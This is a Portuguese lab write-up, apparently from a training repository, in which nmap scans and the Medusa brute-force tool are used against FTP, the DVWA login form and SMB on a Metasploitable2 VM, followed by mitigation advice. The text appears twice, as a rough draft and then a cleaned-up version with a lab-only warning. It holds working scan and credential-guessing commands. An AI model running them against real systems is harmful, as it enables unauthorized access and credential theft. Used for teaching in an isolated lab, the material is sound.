# Realizando Ataques

Seguindo a dinâmica proposta no início deste repositório, o primeiro passo é coletar as informações a respeito de nosso alvo, a VM contendo Metasploitable2. Para realizar isso, e a depender do objetivo do atacante, essa pesquisa pode ser feita de diversas formas, desde analisar o tráfego de rede ou descobrir as portas abertas na máquina do alvo.

Como o desafio foi solicitado para utilizarmos da ferramenta Medusa, que tem como principal objetivo realizar ataques de força bruta, daremos mais atenção para ataques direcionados às portas de serviço (ftp, ssh, http, ...).

## Varredura inicial

Antes de partirmos direto para o Medusa, é necessário ter um panorama geral a respeito do alvo, e como nosso objetivo é estar analizando as portas de serviço, estaremos utilizando o comando `nmap` no terminal.

Como o comando `nmap` requer um alvo ou intervalo de alvos para scanear, e como estamos conectados à mesma rede em ambas as VMs, utilizando:

`ifconfig`

No terminal, encontramos nosso endereço ip e consequentemente, a rede que nosso alvo está. Assim, podemos utilizar:

`nmap -v -sn [IP DA REDE]/[PREFIXO]`

Para que possamos estar verificando os hosts que estão online em nossa rede.

---

Com os hosts descobertos, podemos estar utilizando 

`nmap -v -sV [IP DO ALVO]/[PREFIXO]`

Para estarmos descobrindo mais informações sobre as portas de serviço. Para estarmos sendo mais pontuais, estaremos verificando portas específicas: `21, 22, 80, 139, 445`. Então o comando ficaria:

`nmap -v -sV -p 21,22,80,139,445 [IP DO ALVO]/[PREFIXO]`

---

## FTP

Agora que sabemos sobre as portas de serviço do nosso alvo, vamos começar com um ataque ao serviço FTP.

Para isso, estaremos utilizando o Medusa para descobrir o usuário e senha do acesso. Para isso, ao invés de realizarmos o teste com um usuário e senha por vez, podemos estar criando uma lista com todos os usuários e outro com todas as senhas que iremos testar:

`echo -e "user\nmsfadmin\nadmin\nroot" > users.txt` & `echo -e "123456\npassword\nqwerty\nmsfadmin"`

 Assim podemos executar:

`medusa -h [IP DO ALVO]/[PREFIXO] -U [caminho do arquivo de usuários] -P [caminho do arquivo de senhas] -M ftp`

Com isso, Medusa irá nos retornar todas as tentativas com as combinações possíveis de todos os usuários e senhas que a entregamos. Caso algum seja bem sucedido, irá ser mostrado `[SUCCESS]`. Assim podemos estar acessando esse serviço com o usuário e senha que conseguiram acesso.

---

## DVWA

Para estarmos praticando um ataque de envio de formulário web, podemos estar acessando pelo navegador `[IP DO ALVO]/dvwa/php.login`.

Com isso, veremos uma tela contendo um formulário de acesso básico. 

Acessando as ferramentas para desenvolvedores com RMB (botão direito do mouse ou touchpad) -> "Inspecionar", acessando a aba de "Network", podemos ver todas as requisições feitas no site. Com isso, podemos ver que ao tentar inserir um usuário e senha errado, o site retorna "Login failed". Estaremos utilizando isso para métrica da Medusa para saber se o login funcionou ou não.

Utilizando aquelas mesmas wordlists que criamos para o acesso ftp, faremos:

```
medusa -h [IP DO ALVO] -U [caminho do arquivo de usuários] -P [caminho do arquivo de senhas] -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed'
```

Com isso, conseguimos descobrir qual o usuário e senha para acessar esse formulário, vendo a saído com a flag "SUCCESS".

---

## SMB

Utilizando o comando `enum4linuz -a [IP DO ALVO] | tee enum4_output.txt` conseguimos estar realizando uma enumeração completa do host alvo e salvando em um arquivo para análise posterior.

Então, com o comando `medusa -h [IP DO ALVO] -U [caminho para o arquivo de usuários] -P [caminho para o arquivo de senhas] -M smbnt` conseguimos estar verificando se foi possível acessar o host com a nossa wordlist

---

## Mitigando

- MFA
- Senhas fortes e que expiram
- Monitoramento
- Bloqueio de IPs
- Segmentação da rede
- Auditorias regulares
# Realizando Ataques

Seguindo a dinâmica proposta no início deste repositório, o primeiro passo é coletar informações a respeito do nosso alvo: a VM contendo o Metasploitable2. Essa coleta pode ser feita de diversas formas, dependendo do objetivo do atacante — desde analisar o tráfego de rede até descobrir as portas abertas na máquina-alvo.

Como o desafio pede o uso da ferramenta Medusa, cujo principal objetivo é realizar ataques de força bruta, daremos mais atenção aos ataques direcionados às portas de serviço (FTP, SSH, HTTP, etc.).

> ⚠️ **Aviso**: os procedimentos abaixo devem ser executados exclusivamente em ambiente de laboratório controlado (como o Metasploitable2), para fins educacionais. Realizar esses ataques contra sistemas sem autorização explícita é ilegal.

## Varredura inicial

Antes de partir direto para o Medusa, é necessário ter um panorama geral do alvo. Como o objetivo é analisar as portas de serviço, usaremos o comando `nmap` no terminal.

Como o `nmap` requer um alvo ou intervalo de alvos para escanear, e como as duas VMs estão na mesma rede, usamos primeiro:

```bash
ifconfig
```

No terminal, encontramos nosso endereço IP e, consequentemente, a rede em que o alvo está. Assim, podemos usar:

```bash
nmap -v -sn [IP DA REDE]/[PREFIXO]
```

Para verificar quais hosts estão online na rede.

Com os hosts descobertos, usamos:

```bash
nmap -v -sV [IP DO ALVO]/[PREFIXO]
```

Para descobrir mais informações sobre as portas de serviço. Para sermos mais pontuais, vamos verificar portas específicas: `21, 22, 80, 139, 445`. O comando fica:

```bash
nmap -v -sV -p 21,22,80,139,445 [IP DO ALVO]/[PREFIXO]
```

## FTP

Com as portas de serviço mapeadas, vamos começar com um ataque ao serviço FTP.

Para isso, usaremos o Medusa para descobrir o usuário e a senha de acesso. Em vez de testar uma combinação por vez, criamos uma lista com todos os usuários e outra com todas as senhas a serem testadas:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > passwords.txt
```

Em seguida, executamos:

```bash
medusa -h [IP DO ALVO]/[PREFIXO] -U [caminho do arquivo de usuários] -P [caminho do arquivo de senhas] -M ftp
```

O Medusa retornará todas as tentativas com as combinações possíveis de usuário e senha. Caso alguma seja bem-sucedida, aparecerá `[SUCCESS]`, e poderemos usar essas credenciais para acessar o serviço.

## DVWA

Para praticar um ataque de envio de formulário web, acessamos pelo navegador `[IP DO ALVO]/dvwa/login.php`.

Isso exibe uma tela com um formulário de login básico. Abrindo as ferramentas de desenvolvedor (botão direito → "Inspecionar") e acessando a aba "Network", conseguimos ver todas as requisições feitas pelo site. Ao inserir um usuário e senha incorretos, o site retorna a mensagem "Login failed" — usaremos esse texto como critério para o Medusa identificar se o login funcionou ou não.

Reaproveitando as wordlists criadas para o ataque FTP:

```bash
medusa -h [IP DO ALVO] -U [caminho do arquivo de usuários] -P [caminho do arquivo de senhas] -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed'
```

Com isso, descobrimos o usuário e a senha corretos ao vermos a saída com a flag `SUCCESS`.

## SMB

Com o comando:

```bash
enum4linux -a [IP DO ALVO] | tee enum4_output.txt
```

realizamos uma enumeração completa do host-alvo e salvamos o resultado em um arquivo para análise posterior.

Em seguida, com:

```bash
medusa -h [IP DO ALVO] -U [caminho do arquivo de usuários] -P [caminho do arquivo de senhas] -M smbnt
```

verificamos se é possível acessar o host usando nossa wordlist.

## Mitigação

- Autenticação multifator (MFA)
- Senhas fortes, com expiração periódica
- Monitoramento contínuo de acessos
- Bloqueio de IPs após tentativas repetidas
- Segmentação de rede
- Auditorias de segurança regulares
